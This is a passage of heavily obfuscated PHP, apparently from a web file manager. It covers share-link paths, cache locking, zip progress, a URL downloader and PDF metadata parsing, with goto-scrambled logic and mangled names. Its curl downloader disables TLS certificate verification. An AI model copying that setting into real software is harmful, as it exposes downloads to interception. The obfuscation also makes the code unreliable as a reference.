getPathOuter($FŒ›¼´Ã“) { goto e½İïÃÒ× ; FâØÆãÆâ–: $d¡¯¥©òÑ = KodIO::clear($FŒ›¼´Ã“); $bÁ•ßí°¨ì = KodIO::clear($this->pathParse[$Eø¯¯ÉŸô±[439]][$Eø¯¯ÉŸô±[1013]]); $B¾×¥‚Ù—ë = substr($d¡¯¥©òÑ, strlen($bÁ•ßí°¨ì)); goto c¼ÒÏ§‚æÙ; c¼ÒÏ§‚æÙ: if (substr($d¡¯¥©òÑ, 0, strlen($bÁ•ßí°¨ì)) != $bÁ•ßí°¨ì) { return !1; } return $this->pathParse[$Eø¯¯ÉŸô±[1007]] . $Eø¯¯ÉŸô±[8] . ltrim($B¾×¥‚Ù—ë, $Eø¯¯ÉŸô±[8]); goto AÇÑ¿Í”“œ; e½İïÃÒ× : $Eø¯¯ÉŸô± =& $_SERVER[îÖ]; $Dëèó¶òğë = KodIO::parse($FŒ›¼´Ã“); if ($Dëèó¶òğë[$Eø¯¯ÉŸô±[29]] == KodIO::KOD_SHARE_ITEM) { return $Dëèó¶òğë[$Eø¯¯ÉŸô±[75]]; } goto FâØÆãÆâ–; AÇÑ¿Í”“œ: } public function getType() { $C¨ÒÛ¢Å¹ =& $_SERVER[îÖ]; $dÏŸñğ¦ = str_replace($C¨ÒÛ¢Å¹[71], $C¨ÒÛ¢Å¹[33], get_class($this)); return strtolower($dÏŸñğ¦); } public function isTypeObject($dº±ÁğÂÏï) { return IO::isTypeObject($dº±ÁğÂÏï); } public function info($EœÇ†·Û„) { return $this->infoParse($EœÇ†·Û„); } public function infoAuth($F“«—ÉŸ¦‡) { return $this->infoParse($F“«—ÉŸ¦‡); } public function infoWithChildren($A‘Š’İÆè±) { return $this->infoParse($A‘Š’İÆè±, !0); } public function infoFull($a…–ŒÓÊÜ—) { return $this->infoParse($a…–ŒÓÊÜ—); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($C‰à£‚ùé) { $this->pathParse = $C‰à£‚ùé; } protected function infoParse($bÖÊªØ¨¹‡, $b“”îè¸ŠÈ = false) { $bø¥¼Å¦È¹ =& $_SERVER[îÖ]; return Action($bø¥¼Å¦È¹[1012])->sharePathInfo($this->pathParse[$bø¥¼Å¦È¹[75]], !0, $b“”îè¸ŠÈ); } public function listPath($bÜ‚¸æÜÑ, $BñÜò‹ì‚š = false) { $B©ìô•±½Ğ =& $_SERVER[îÖ]; $e‚ÀÚ¥áôÜ = IO::listPath($bÜ‚¸æÜÑ, $BñÜò‹ì‚š); foreach ($e‚ÀÚ¥áôÜ as $cõğëÏˆ‹ => $DïÔØŠ×´ö) { if (!in_array($cõğëÏˆ‹, array($B©ìô•±½Ğ[73], $B©ìô•±½Ğ[74]))) { continue; } foreach ($DïÔØŠ×´ö as $dƒÑ®ñç¶õ => $c‚ÜºË•“İ) { $c‚ÜºË•“İ = Action($B©ìô•±½Ğ[1127])->parsePathChildren($c‚ÜºË•“İ, array($B©ìô•±½Ğ[387] => $bÜ‚¸æÜÑ)); $e‚ÀÚ¥áôÜ[$cõğëÏˆ‹][$dƒÑ®ñç¶õ] = Action($B©ìô•±½Ğ[1012])->shareItemInfo($c‚ÜºË•“İ); } } return $e‚ÀÚ¥áôÜ; } public function listAll($A¯´Ó¡¯æÓ) { $Bƒ¬éí¯Ÿ =& $_SERVER[îÖ]; $EŸíÀê¬İ = IO::listAll($A¯´Ó¡¯æÓ); foreach ($EŸíÀê¬İ as &$DÕ¿»šœ¢) { $DÕ¿»šœ¢ = array_merge(IO::info($DÕ¿»šœ¢[$Bƒ¬éí¯Ÿ[75]]), $DÕ¿»šœ¢); $DÕ¿»šœ¢[$Bƒ¬éí¯Ÿ[391]] = Action($Bƒ¬éí¯Ÿ[1012])->shareItemInfo($DÕ¿»šœ¢); } return $EŸíÀê¬İ; } } goto eîÎøÆ¼ªè; EÛ¿èŒïÌ¨: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $D‹Óùó´æÙ =& $_SERVER[îÖ]; $e¹Ç‘¹î‘£ = $GLOBALS[$D‹Óùó´æÙ[6]][$D‹Óùó´æÙ[337]]; self::$cachePath = $e¹Ç‘¹î‘£[$D‹Óùó´æÙ[167]][$D‹Óùó´æÙ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Fº¾Ğ¯åÍ, $A¯³Ä•Äó = 0) { goto bÄÚ™òöŒ„; bÄÚ™òöŒ„: $f¨Ì©ŠÇÏ¾ =& $_SERVER[îÖ]; $a©ó½‚­èƒ = microtime(!0); $b¾ò¹¾‘âõ = $a©ó½‚­èƒ + $A¯³Ä•Äó + 0.0001; goto C «ÛÁŠŞ; BºåñÃÉÊ™: $this->unlock($Fº¾Ğ¯åÍ); return !1; goto C÷¾ˆöÏÈµ; C «ÛÁŠŞ: $döŠ‰é‹°³ = rtrim(self::$cachePath, $f¨Ì©ŠÇÏ¾[8]) . $f¨Ì©ŠÇÏ¾[773] . md5($Fº¾Ğ¯åÍ) . $f¨Ì©ŠÇÏ¾[774]; if (file_exists($döŠ‰é‹°³) && filemtime($döŠ‰é‹°³) && filemtime($döŠ‰é‹°³) < time() - 10) { @unlink($döŠ‰é‹°³); } do { if (file_exists($döŠ‰é‹°³)) { cacheLockWait(); continue; } $Cìëöš—’œ = fopen($döŠ‰é‹°³, $f¨Ì©ŠÇÏ¾[775]); if (!$Cìëöš—’œ) { return !1; } $bÏë¡À× = flock($Cìëöš—’œ, LOCK_EX | LOCK_NB); self::$caches[$Fº¾Ğ¯åÍ] = array($f¨Ì©ŠÇÏ¾[776] => $Cìëöš—’œ, $f¨Ì©ŠÇÏ¾[167] => $döŠ‰é‹°³); fwrite($Cìëöš—’œ, $b¾ò¹¾‘âõ); clearstatcache(); if ($Cìëöš—’œ && $bÏë¡À×) { return !0; } cacheLockWait(); } while (microtime(!0) < $b¾ò¹¾‘âõ); goto BºåñÃÉÊ™; C÷¾ˆöÏÈµ: } public function lockGet($CÌÁš‹³¾) { $A·Åƒ—¢Ô³ =& $_SERVER[îÖ]; $E”Í…êğŠÏ = rtrim(self::$cachePath, $A·Åƒ—¢Ô³[8]) . $A·Åƒ—¢Ô³[773] . md5($CÌÁš‹³¾) . $A·Åƒ—¢Ô³[774]; return file_exists($E”Í…êğŠÏ); } public function unlock($a‡…ÖÒŠÔ¢) { goto CÈœ¼º‚Ó; dÖ‰¿áïìí: unset(self::$caches[$a‡…ÖÒŠÔ¢]); goto d²­ª¨†Õ; e¢‘©óé—: @flock($e‡ÖÎ¤Û‡Ï[$E†«™£¾¾ê[776]], LOCK_UN); @fclose($e‡ÖÎ¤Û‡Ï[$E†«™£¾¾ê[776]]); @unlink($e‡ÖÎ¤Û‡Ï[$E†«™£¾¾ê[167]]); goto dÖ‰¿áïìí; CÈœ¼º‚Ó: $E†«™£¾¾ê =& $_SERVER[îÖ]; $e‡ÖÎ¤Û‡Ï = self::$caches[$a‡…ÖÒŠÔ¢]; if (!$e‡ÖÎ¤Û‡Ï) { return; } goto e¢‘©óé—; d²­ª¨†Õ: } } class CacheLockRedis { public function lock($b§Ó´İ¥Æ, $d×öÌ‹³™ö = 10) { $Cèå·Ë×ÌË = Cache::init(); $Dƒ§ ‰Åî­ = microtime(!0) + $d×öÌ‹³™ö; while (microtime(!0) < $Dƒ§ ‰Åî­) { $cÒŞÌö‡² = $Cèå·Ë×ÌË->get($b§Ó´İ¥Æ); if (!$cÒŞÌö‡²) { $D¼¦ä”ßÑæ = $Cèå·Ë×ÌË->setLock($b§Ó´İ¥Æ, $Dƒ§ ‰Åî­, $d×öÌ‹³™ö); if ($D¼¦ä”ßÑæ) { return !0; } } else { if ($cÒŞÌö‡² < microtime(!0)) { $Cèå·Ë×ÌË->set($b§Ó´İ¥Æ, $Dƒ§ ‰Åî­, $Dƒ§ ‰Åî­); if ($Cèå·Ë×ÌË->get($b§Ó´İ¥Æ) === $cÒŞÌö‡²) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($e¬ˆËàŒ±ï) { return Cache::init()->get($e¬ˆËàŒ±ï); } public function unlock($bÕ×‰”ÓŠñ) { return Cache::init()->remove($bÕ×‰”ÓŠñ); } } goto d“Ú•Î„ö¼; e„ª¿Ö¼ ¬: class TaskZip extends TaskFileTransfer { protected function startAfter() { $EÆÃÉÚÇÂ =& $_SERVER[îÖ]; parent::startAfter(); Hook::bind($EÆÃÉÚÇÂ[1507], array($this, $EÆÃÉÚÇÂ[1502])); $bÈÀ¶Íöİ‘ =& $this->task; $bÈÀ¶Íöİ‘[$EÆÃÉÚÇÂ[1504]] = $EÆÃÉÚÇÂ[1034]; if (!$bÈÀ¶Íöİ‘[$EÆÃÉÚÇÂ[1337]]) { $bÈÀ¶Íöİ‘[$EÆÃÉÚÇÂ[1337]] = LNG($EÆÃÉÚÇÂ[1508]); } } protected function endAfter() { $CÛ³áğÛñ =& $_SERVER[îÖ]; parent::endAfter(); Hook::unbind($CÛ³áğÛñ[1507], array($this, $CÛ³áğÛñ[1502])); } public function updateAfter() { $FğïÂù‚°† =& $_SERVER[îÖ]; $BÀ¨‘°…Õ =& $this->task; if (!$BÀ¨‘°…Õ[$FğïÂù‚°†[970]] || !$BÀ¨‘°…Õ[$FğïÂù‚°†[697]]) { return; } if ($BÀ¨‘°…Õ[$FğïÂù‚°†[1504]] == $FğïÂù‚°†[1034]) { $fä´™‘¤Ã = $BÀ¨‘°…Õ[$FğïÂù‚°†[1477]]; if ($BÀ¨‘°…Õ[$FğïÂù‚°†[1478]] != $FğïÂù‚°†[1034]) { $fä´™‘¤Ã = 0; } $DÏ¯ÂÙ§æˆ = ($BÀ¨‘°…Õ[$FğïÂù‚°†[1481]] + $fä´™‘¤Ã) / $BÀ¨‘°…Õ[$FğïÂù‚°†[697]]; $BÀ¨‘°…Õ[$FğïÂù‚°†[1432]] = $DÏ¯ÂÙ§æˆ * 0.3; } else { if ($BÀ¨‘°…Õ[$FğïÂù‚°†[1504]] == $FğïÂù‚°†[301]) { $DÏ¯ÂÙ§æˆ = $BÀ¨‘°…Õ[$FğïÂù‚°†[984]] / $BÀ¨‘°…Õ[$FğïÂù‚°†[970]]; $BÀ¨‘°…Õ[$FğïÂù‚°†[1432]] = 0.3 + $DÏ¯ÂÙ§æˆ * 0.5; } else { if ($BÀ¨‘°…Õ[$FğïÂù‚°†[1504]] == $FğïÂù‚°†[103]) { $DÏ¯ÂÙ§æˆ = 0; if ($BÀ¨‘°…Õ[$FğïÂù‚°†[1476]]) { $DÏ¯ÂÙ§æˆ = $BÀ¨‘°…Õ[$FğïÂù‚°†[1477]] / $BÀ¨‘°…Õ[$FğïÂù‚°†[1476]]; } $BÀ¨‘°…Õ[$FğïÂù‚°†[1432]] = 0.3 + 0.5 + $DÏ¯ÂÙ§æˆ * 0.2; } } } if ($BÀ¨‘°…Õ[$FğïÂù‚°†[1432]] > 0) { $e„’ßâÔ’— = timeFloat() - $BÀ¨‘°…Õ[$FğïÂù‚°†[1434]] - $BÀ¨‘°…Õ[$FğïÂù‚°†[1437]]; $BÀ¨‘°…Õ[$FğïÂù‚°†[1438]] = $e„’ßâÔ’— * (1 - $BÀ¨‘°…Õ[$FğïÂù‚°†[1432]]) / $BÀ¨‘°…Õ[$FğïÂù‚°†[1432]]; } } public function copyFileStart($eœÙáµà„, $D‰‘…”¡¬˜, $EƒñĞ ÚÑ, $Eë†ß‰ù, $f°¿¡·ËÉß, $Añ¶Üçø××) { $Bãö§Ã¹ˆ =& $_SERVER[îÖ]; parent::copyFileStart($eœÙáµà„, $D‰‘…”¡¬˜, $EƒñĞ ÚÑ, $Eë†ß‰ù, $f°¿¡·ËÉß, $Añ¶Üçø××); $CŠÎ´óì =& $this->task; if ($CŠÎ´óì[$Bãö§Ã¹ˆ[1504]] == $Bãö§Ã¹ˆ[301]) { $CŠÎ´óì[$Bãö§Ã¹ˆ[1504]] = $Bãö§Ã¹ˆ[103]; } $this->update(); } public function copyFileEnd($f™¼ïùò©©, $E˜èºÀºä, $aàæ´¤¯Ù¬, $CĞÇÇ¬’àï, $d×¶Íïğê, $CœÖ»©ŠÜ) { $E‰½Á¶„” =& $_SERVER[îÖ]; $CŠé—™Ñµç =& $this->task; $CŠé—™Ñµç[$E‰½Á¶„”[1477]] = $CŠé—™Ñµç[$E‰½Á¶„”[1476]]; $CŠé—™Ñµç[$E‰½Á¶„”[1481]] += $CŠé—™Ñµç[$E‰½Á¶„”[1476]]; $CŠé—™Ñµç[$E‰½Á¶„”[1478]] = $E‰½Á¶„”[33]; $this->update(); } public function nameParse($f‹°«¢ÄÈ•) { $D¾‰ìÑšù =& $_SERVER[îÖ]; $e©Æ¾³¿ë¶ =& $this->task; if ($e©Æ¾³¿ë¶[$D¾‰ìÑšù[984]] < $e©Æ¾³¿ë¶[$D¾‰ìÑšù[970]]) { $E­Ïáäô¦¹ = get_path_this($f‹°«¢ÄÈ•); if (strstr($E­Ïáäô¦¹, $D¾‰ìÑšù[91])) { $e©Æ¾³¿ë¶[$D¾‰ìÑšù[984]] += 1; } } if ($e©Æ¾³¿ë¶[$D¾‰ìÑšù[1504]] == $D¾‰ìÑšù[1034]) { $e©Æ¾³¿ë¶[$D¾‰ìÑšù[1504]] = $D¾‰ìÑšù[301]; } $e©Æ¾³¿ë¶[$D¾‰ìÑšù[1474]] = $f‹°«¢ÄÈ•; $this->update(); } } class Downloader { static function start($BƒÍ¯ÑÌ†¸, $F’´Ú¯›‰¾, $eğÀßè÷Ê = 10) { goto dŞ¶Á†¾‘À; FÀåÏËÌ‡: if ($a¹’óæÉë > $a®ÄÖñÜë) { @unlink($A¡Å½§¤Ä¡); } file_put_contents($aá§ôĞ‡À…, json_encode($D…çªôÃè•)); $c¾Ì°‘ğ = self::fileDownloadCurl($BƒÍ¯ÑÌ†¸, $F’´Ú¯›‰¾, !0, $a¹’óæÉë, $a®ÄÖñÜë); goto f“‘—ø´Ûî; f“‘—ø´Ûî: if ($c¾Ì°‘ğ[$Bêõ‘â˜ĞÄ[1026]]) { @unlink($aá§ôĞ‡À…); } return $c¾Ì°‘ğ; goto d‘¹«¹Æ¶÷; E‡äñ÷ã¢–: if (is_file($aá§ôĞ‡À…)) { $b‘‘íœ°æÃ = file_get_contents($aá§ôĞ‡À…); $D…çªôÃè• = json_decode($b‘‘íœ°æÃ, 1); } if (file_exists($F’´Ú¯›‰¾) && $a®ÄÖñÜë == filesize($F’´Ú¯›‰¾)) { @unlink($A¡Å½§¤Ä¡); @unlink($aá§ôĞ‡À…); return array($Bêõ‘â˜ĞÄ[1026] => !0, $Bêõ‘â˜ĞÄ[1028] => $Bêõ‘â˜ĞÄ[1512]); } if ($D…çªôÃè•[$Bêõ‘â˜ĞÄ[325]] != $a®ÄÖñÜë) { $D…çªôÃè• = array($Bêõ‘â˜ĞÄ[325] => $a®ÄÖñÜë); } goto FÀåÏËÌ‡; A©ØİÀö‘Ú: $a®ÄÖñÜë = intval($B…ÙÎƒÎªâ[$Bêõ‘â˜ĞÄ[325]]); if (file_exists($A¡Å½§¤Ä¡) && time() - filemtime($A¡Å½§¤Ä¡) < 3) { return array($Bêõ‘â˜ĞÄ[1026] => !1, $Bêõ‘â˜ĞÄ[1028] => $Bêõ‘â˜ĞÄ[1511]); } $D…çªôÃè• = array(); goto E‡äñ÷ã¢–; BÊß†Òñœ: if (!$BƒÍ¯ÑÌ†¸) { return array($Bêõ‘â˜ĞÄ[1026] => !1, $Bêõ‘â˜ĞÄ[1028] => $Bêõ‘â˜ĞÄ[1031]); } if (!$B…ÙÎƒÎªâ[$Bêõ‘â˜ĞÄ[1282]] || $B…ÙÎƒÎªâ[$Bêõ‘â˜ĞÄ[325]] == 0) { @unlink($A¡Å½§¤Ä¡); @unlink($F’´Ú¯›‰¾); $c¾Ì°‘ğ = self::fileDownloadFopen($BƒÍ¯ÑÌ†¸, $F’´Ú¯›‰¾, $B…ÙÎƒÎªâ[$Bêõ‘â˜ĞÄ[325]]); if ($c¾Ì°‘ğ[$Bêõ‘â˜ĞÄ[1026]]) { return $c¾Ì°‘ğ; } else { @unlink($A¡Å½§¤Ä¡); @unlink($F’´Ú¯›‰¾); $c¾Ì°‘ğ = self::fileDownloadCurl($BƒÍ¯ÑÌ†¸, $F’´Ú¯›‰¾, !1, 0, $B…ÙÎƒÎªâ[$Bêõ‘â˜ĞÄ[325]]); @unlink($A¡Å½§¤Ä¡); return $c¾Ì°‘ğ; } } $a¹’óæÉë = is_file($A¡Å½§¤Ä¡) ? filesize($A¡Å½§¤Ä¡) : 0; goto A©ØİÀö‘Ú; dŞ¶Á†¾‘À: $Bêõ‘â˜ĞÄ =& $_SERVER[îÖ]; if (!request_url_safe($BƒÍ¯ÑÌ†¸)) { return array($Bêõ‘â˜ĞÄ[1026] => !1, $Bêõ‘â˜ĞÄ[1028] => $Bêõ‘â˜ĞÄ[1031]); } $aá§ôĞ‡À… = $F’´Ú¯›‰¾ . $Bêõ‘â˜ĞÄ[1509]; goto Dš¦á„ˆƒß; Dš¦á„ˆƒß: $A¡Å½§¤Ä¡ = $F’´Ú¯›‰¾ . $Bêõ‘â˜ĞÄ[1510]; if (is_array($BƒÍ¯ÑÌ†¸)) { $B…ÙÎƒÎªâ = $BƒÍ¯ÑÌ†¸; } else { $B…ÙÎƒÎªâ = url_header($BƒÍ¯ÑÌ†¸); } $BƒÍ¯ÑÌ†¸ = $B…ÙÎƒÎªâ[$Bêõ‘â˜ĞÄ[295]]; goto BÊß†Òñœ; d‘¹«¹Æ¶÷: } static function fileDownloadFopen($B¡™ÀĞ×¬¿, $fá¹¾¦¾åŠ, $aöâ¾ôÊÈ¸ = 0) { $BËÁ¸ë¦Œß =& $_SERVER[îÖ]; @ini_set($BËÁ¸ë¦Œß[1513], $BËÁ¸ë¦Œß[1514]); $dà¯Å¸‚‹õ = $fá¹¾¦¾åŠ . $BËÁ¸ë¦Œß[1510]; set_timeout(); @unlink($dà¯Å¸‚‹õ); if ($c”ÆÁ¥æ = @fopen($B¡™ÀĞ×¬¿, $BËÁ¸ë¦Œß[1515])) { goto A¡™µ¯Ôò; A¡™µ¯Ôò: if (!($aî›±†öŞÃ = @fopen($dà¯Å¸‚‹õ, $BËÁ¸ë¦Œß[1516]))) { return array($BËÁ¸ë¦Œß[1026] => !1, $BËÁ¸ë¦Œß[1028] => $BËÁ¸ë¦Œß[1517]); } while (!feof($c”ÆÁ¥æ)) { if (!file_exists($dà¯Å¸‚‹õ)) { fclose($aî›±†öŞÃ); return array($BËÁ¸ë¦Œß[1026] => !1, $BËÁ¸ë¦Œß[1028] => $BËÁ¸ë¦Œß[1518]); } clearstatcache(); if ($aöâ¾ôÊÈ¸ > 0 && $aöâ¾ôÊÈ¸ == filesize(iconv_system($dà¯Å¸‚‹õ))) { break; } fwrite($aî›±†öŞÃ, fread($c”ÆÁ¥æ, 1024 * 8), 1024 * 8); } fclose($aî›±†öŞÃ); goto dÚä»óºÎ; dÚä»óºÎ: fclose($c”ÆÁ¥æ); self::checkGzip($dà¯Å¸‚‹õ); if (!@rename($dà¯Å¸‚‹õ, $fá¹¾¦¾åŠ)) { usleep(round(rand(0, 1000) * 50)); @unlink($fá¹¾¦¾åŠ); $f­½é‹Ü¤ä = @rename($dà¯Å¸‚‹õ, $fá¹¾¦¾åŠ); if (!$f­½é‹Ü¤ä) { return array($BËÁ¸ë¦Œß[1026] => !1, $BËÁ¸ë¦Œß[1028] => $BËÁ¸ë¦Œß[1519]); } } goto bµéÔ™ÚÚ; bµéÔ™ÚÚ: return array($BËÁ¸ë¦Œß[1026] => !0, $BËÁ¸ë¦Œß[1028] => $BËÁ¸ë¦Œß[695]); goto cğ±Æ¶†Á¤; cğ±Æ¶†Á¤: } else { return array($BËÁ¸ë¦Œß[1026] => !1, $BËÁ¸ë¦Œß[1028] => $BËÁ¸ë¦Œß[1520]); } } static function fileDownloadCurl($BñŞà†µõ, $CÌÛÆÆ¶¢ö, $FË°Ü‘ˆå¯ = false, $BÑÑñ‰äâ· = 0, $e’°¬·¿ = 0) { goto FÓ›¸É²Üó; aËÓ¹Âï¶¾: if ($C¿Àí¸È»¬ < $e’°¬·¿ && $e’°¬·¿ != 0) { return array($eµ‡áµ ¿í[1026] => !1, $eµ‡áµ ¿í[1028] => $eµ‡áµ ¿í[1511]); } if ($báÓôÆÒëº && filesize($e°Ïà³ÔÓ) != 0) { self::checkGzip($e°Ïà³ÔÓ); if (!@rename($e°Ïà³ÔÓ, $CÌÛÆÆ¶¢ö)) { @unlink($CÌÛÆÆ¶¢ö); $báÓôÆÒëº = @rename($e°Ïà³ÔÓ, $CÌÛÆÆ¶¢ö); if (!$báÓôÆÒëº) { return array($eµ‡áµ ¿í[1026] => !1, $eµ‡áµ ¿í[1028] => $eµ‡áµ ¿í[1523]); } } return array($eµ‡áµ ¿í[1026] => !0, $eµ‡áµ ¿í[1028] => $eµ‡áµ ¿í[695]); } return array($eµ‡áµ ¿í[1026] => !1, $eµ‡áµ ¿í[1028] => $eµ‡áµ ¿í[1524]); goto C³‚Ó–ğÇ; FÓ›¸É²Üó: $eµ‡áµ ¿í =& $_SERVER[îÖ]; $e°Ïà³ÔÓ = $CÌÛÆÆ¶¢ö . $eµ‡áµ ¿í[1510]; set_timeout(); goto f…§“†ù‰µ; AÜ ’•‡‰Î: if ($FË°Ü‘ˆå¯) { curl_setopt($aÓ²Ñ†äË, CURLOPT_RANGE, $BÑÑñ‰äâ· . $eµ‡áµ ¿í[715]); } curl_setopt($aÓ²Ñ†äË, CURLOPT_FILE, $bŠİå…Ã¿); curl_setopt($aÓ²Ñ†äË, CURLOPT_REFERER, get_url_link($BñŞà†µõ)); goto Aª»Œ¥Â°Ï; e»™›ï¶Ğ¹: curl_setopt($aÓ²Ñ†äË, CURLOPT_NOPROGRESS, !1); curl_setopt($aÓ²Ñ†äË, CURLOPT_PROGRESSFUNCTION, $eµ‡áµ ¿í[1522]); curl_progress_start($aÓ²Ñ†äË); goto b³Â’æµä¨; D”¶Ïè²Ø: curl_close($aÓ²Ñ†äË); fclose($bŠİå…Ã¿); $C¿Àí¸È»¬ = filesize(iconv_system($e°Ïà³ÔÓ)); goto aËÓ¹Âï¶¾; f…§“†ù‰µ: $bŠİå…Ã¿ = @fopen($e°Ïà³ÔÓ, $eµ‡áµ ¿í[974]); if (!$bŠİå…Ã¿) { return array($eµ‡áµ ¿í[1026] => !1, $eµ‡áµ ¿í[1028] => $eµ‡áµ ¿í[1521]); } $aÓ²Ñ†äË = curl_init($BñŞà†µõ); goto AÜ ’•‡‰Î; Aª»Œ¥Â°Ï: curl_setopt($aÓ²Ñ†äË, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($aÓ²Ñ†äË, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($aÓ²Ñ†äË, CURLOPT_SSL_VERIFYHOST, 0); goto e»™›ï¶Ğ¹; b³Â’æµä¨: curl_setopt($aÓ²Ñ†äË, CURLOPT_USERAGENT, $eµ‡áµ ¿í[1514]); $báÓôÆÒëº = curl_exec($aÓ²Ñ†äË); curl_progress_end($aÓ²Ñ†äË); goto D”¶Ïè²Ø; C³‚Ó–ğÇ: } static function checkGzip($B‘š‰¦Ãß¿) { goto f³Äâ½Á¦÷; d„æ¸â½ë: ob_start(); readgzfile($B‘š‰¦Ãß¿); $bİ“Ó‡¤ÛÆ = ob_get_clean(); goto E…ãÒâ¨Ñ—; E…ãÒâ¨Ñ—: file_put_contents($B‘š‰¦Ãß¿, $bİ“Ó‡¤ÛÆ); goto D¢Á³ó¬À‡; f³Äâ½Á¦÷: $d½Óö‡âñ = $_SERVER[îÖ][1525]; $bË è”¦è = file_sub_str($B‘š‰¦Ãß¿, 0, 2); if ($d½Óö‡âñ != $bË è”¦è) { return; } goto d„æ¸â½ë; D¢Á³ó¬À‡: } } class FileParsePdf { public static function parse($B§ã­–î¹) { goto càË‡ŸØ¤„; F¢™Š»İ˜”: preg_match_all($F‚¯•İ‘ÛÕ, $EÓ‹Õ”ŒÄˆ[$C°©ôÂ×» [1527]], $F±£¶Á˜¸Ê); if ($F±£¶Á˜¸Ê[1] && $A÷®Š‹šé[$C°©ôÂ×» [1534]] < $F±£¶Á˜¸Ê[1][0]) { $A÷®Š‹šé[$C°©ôÂ×» [1534]] = $F±£¶Á˜¸Ê[1][0]; } preg_match_all($F‚¯•İ‘ÛÕ, $EÓ‹Õ”ŒÄˆ[$C°©ôÂ×» [1528]], $F±£¶Á˜¸Ê); goto d‹®ÛéÒÖ; E„–Ö×†ÙÍ: if ($F±£¶Á˜¸Ê) { $A÷®Š‹šé[$C°©ôÂ×» [1336]] = $F±£¶Á˜¸Ê[1]; } $A÷®Š‹šé[$C°©ôÂ×» [1534]] = 0; $F‚¯•İ‘ÛÕ = $C°©ôÂ×» [1535]; goto F¢™Š»İ˜”; fğ­„‹§«: $F‚¯•İ‘ÛÕ = $C°©ôÂ×» [1531]; preg_match($F‚¯•İ‘ÛÕ, $EÓ‹Õ”ŒÄˆ[$C°©ôÂ×» [1527]], $F±£¶Á˜¸Ê); if (!$A÷®Š‹šé[$C°©ôÂ×» [1530]] && count($F±£¶Á˜¸Ê) == 5) { $A÷®Š‹šé[$C°©ôÂ×» [1530]] = $F±£¶Á˜¸Ê[3]; $A÷®Š‹šé[$C°©ôÂ×» [1532]] = $F±£¶Á˜¸Ê[4]; } goto Fš¶¸ß¯ï“; d‹®ÛéÒÖ: if ($F±£¶Á˜¸Ê[1] && $A÷®Š‹šé[$C°©ôÂ×» [1534]] < $F±£¶Á˜¸Ê[1][0]) { $A÷®Š‹šé[$C°©ôÂ×» [1534]] = $F±£¶Á˜¸Ê[1][0]; } $A÷®Š‹šé = self::parseInfoItem($A÷®Š‹šé); return $A÷®Š‹šé; goto aãÚ•¼Ğä; càË‡ŸØ¤„: $C°©ôÂ×»  =& $_SERVER[îÖ]; $CŠæÔŸçí = 32 * 1024; $EÓ‹Õ”ŒÄˆ = array($C°©ôÂ×» [776] => fopen($B§ã­–î¹, $C°©ôÂ×» [1164]), $C°©ôÂ×» [75] => $B§ã­–î¹, $C°©ôÂ×» [77] => filesize($B§ã­–î¹), $C°©ôÂ×» [1526] => $CŠæÔŸçí); goto fÚÃ®àãÔ; fÚÃ®àãÔ: $EÓ‹Õ”ŒÄˆ[$C°©ôÂ×» [1527]] = StreamWrapperIO::read($B§ã­–î¹, 0, $CŠæÔŸçí); $EÓ‹Õ”ŒÄˆ[$C°©ôÂ×» [1528]] = StreamWrapperIO::read($B§ã­–î¹, $EÓ‹Õ”ŒÄˆ[$C°©ôÂ×» [77]] - $CŠæÔŸçí, $CŠæÔŸçí); $f‡âíåÁ¥ = self::decodeXref($EÓ‹Õ”ŒÄˆ); goto C©•ŸÜ²é; C©•ŸÜ²é: if ($f‡âíåÁ¥) { $dˆôØªºå = $f‡âíåÁ¥[$C°©ôÂ×» [1529]][$C°©ôÂ×» [1186]]; $A÷®Š‹šé = self::getObjectValue($EÓ‹Õ”ŒÄˆ, $f‡âíåÁ¥, $dˆôØªºå); } $A÷®Š‹šé = is_array($A÷®Š‹šé) ? $A÷®Š‹šé : array(); $A÷®Š‹šé[$C°©ôÂ×» [1530]] = 0; goto fğ­„‹§«; Fš¶¸ß¯ï“: preg_match($F‚¯•İ‘ÛÕ, $EÓ‹Õ”ŒÄˆ[$C°©ôÂ×» [1528]], $F±£¶Á˜¸Ê); if (!$A÷®Š‹šé[$C°©ôÂ×» [1530]] && count($F±£¶Á˜¸Ê) == 5) { $A÷®Š‹šé[$C°©ôÂ×» [1530]] = $F±£¶Á˜¸Ê[3]; $A÷®Š‹šé[$C°©ôÂ×» [1532]] = $F±£¶Á˜¸Ê[4]; } preg_match($C°©ôÂ×» [1533], $EÓ‹Õ”ŒÄˆ[$C°©ôÂ×» [1527]], $F±£¶Á˜¸Ê); goto E„–Ö×†ÙÍ; aãÚ•¼Ğä: } private static function parseInfoItem($d‡ë¡¡£ğò) { $CŞˆŒáÔ =& $_SERVER[îÖ]; if (!$d‡ë¡¡£ğò) { return !1; } $Eõ‰ÑĞö‘Š = array($CŞˆŒáÔ[1337] => array($CŞˆŒáÔ[1536], $CŞˆŒáÔ[33]), $CŞˆŒáÔ[1537] => array($CŞˆŒáÔ[1538], $CŞˆŒáÔ[33]), $CŞˆŒáÔ[187] => array($CŞˆŒáÔ[1539], $CŞˆŒáÔ[210]), $CŞˆŒáÔ[107] => array($CŞˆŒáÔ[1540], $CŞˆŒáÔ[210]), $CŞˆŒáÔ[1534] => array($CŞˆŒáÔ[1534], $CŞˆŒáÔ[276]), $CŞˆŒáÔ[1530] => array($CŞˆŒáÔ[1530], $CŞˆŒáÔ[276]), $CŞˆŒáÔ[1532] => array($CŞˆŒáÔ[1532], $CŞˆŒáÔ[276]), $CŞˆŒáÔ[1541] => array($CŞˆŒáÔ[1542], $CŞˆŒáÔ[33]), $CŞˆŒáÔ[1543] => array($CŞˆŒáÔ[1544], $CŞˆŒáÔ[33]), $CŞˆŒáÔ[1545] => array($CŞˆŒáÔ[1336], $CŞˆŒáÔ[33])); $eáòÕ’ÉÆ¸ = array(); foreach ($Eõ‰ÑĞö‘Š as $e¨íâå³Ş‹ => $aëë—µÂŠö) { if (!isset($d‡ë¡¡£ğò[$aëë—µÂŠö[0]])) { continue; } $bë“‘šâ¼› = $d‡ë¡¡£ğò[$aëë—µÂŠö[0]]; if (!$bë“‘šâ¼› || is_array($bë“‘šâ¼›)) { continue; } switch ($aëë—µÂŠö[1]) { case $CŞˆŒáÔ[276]: $bë“‘šâ¼› = intval($bë“‘šâ¼›); break; case $CŞˆŒáÔ[210]: if 